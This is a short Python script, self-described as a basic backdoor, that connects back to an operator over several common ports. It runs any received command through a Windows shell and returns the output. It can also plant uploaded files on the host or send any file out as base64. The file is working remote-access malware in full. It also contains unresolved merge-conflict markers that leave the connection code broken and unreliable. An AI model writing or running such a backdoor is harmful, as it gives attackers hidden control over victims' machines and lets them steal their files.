# Basic backdoor to send windows commands and upload/download files against a windows host
# author: ropeadope62 

import socket
import time
import subprocess
import codecs



def upload(mysocket):
    mysocket.send(b"What is the name of the file you are uploading?:")
    fname = mysocket.recv(1024).decode()
    mysocket.send(b"What unique string will end the transmission?:")
    endoffile = mysocket.recv(1024)
    mysocket.send(b"Transmit the file as a base64 encoded string followed by the end of transmission string.\n")
    data = b""
<<<<<<< HEAD
=======
  
>>>>>>> 947908878418f637c1c9b0bc60df457aa2ab50c5
    while not data.endswith(endoffile):
        data += mysocket.recv(1024)
    try:
        fh = open(fname.strip(), "w")
        fh.write(codecs.decode(data[:-len(endoffile)], "base64").decode("latin-1"))
        fh.close()
    except Exception as e:
        mysocket.send("An error occured uploading file {0}. {1}".format(fname, str(e)).encode())
    else:
        mysocket.send(fname.strip().encode() + b" successfully planted file.")

def download(mysocket):

    mysocket.send(b"What file do you want (including path)?:")
    fname = mysocket.recv(1024).decode()
    mysocket.send(b"Receive a base64 encoded string containing your file will end with !EOF!\n")
    try:
        data = codecs.encode(open(fname.strip(),"rb").read(), "base64")
    except Exception as e:
        data = "An error occured downloading the file {0}. {1}".format(fname, str(e)).encode()
    mysocket.sendall(data + "!EOF!".encode())


def ScanAndConnect():
    print("it started")
<<<<<<< HEAD
    dstip = "127.0.0.1"
=======
>>>>>>> 947908878418f637c1c9b0bc60df457aa2ab50c5
    connected = False
    while not connected:
        for port in [21, 22, 81, 443, 8000]:
            time.sleep(1)
            try:
                print("Trying", port, end=" ")
<<<<<<< HEAD
                mysocket.connect((dstip, port))
=======
                mysocket.connect(("dstip", port))
>>>>>>> 947908878418f637c1c9b0bc60df457aa2ab50c5
            except socket.error:
                print("Nope")
                continue
            else:
                print("Connected")
                connected = True
                break

mysocket = socket.socket()
ScanAndConnect()
while True:
    try:
        commandrequested = mysocket.recv(1024).decode()
        if len(commandrequested) == 0:
            time.sleep(3)
            mysocket = socket.socket()
            ScanAndConnect()
            continue
        if commandrequested[:4] == "QUIT":
            mysocket.send(b"Terminating Connection.")
            break
        if commandrequested[:6] == "UPLOAD":
            upload(mysocket)
            continue
        if commandrequested[:8] == "DOWNLOAD":
            download(mysocket)
            continue
        prochandle = subprocess.Popen(
            commandrequested, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        results, errors = prochandle.communicate()
        results = results + errors
        mysocket.send(results)
    
    except socket.error:
        break
    except Exception as e:
        mysocket.send(bytes(str(e), "utf-8"))
        break

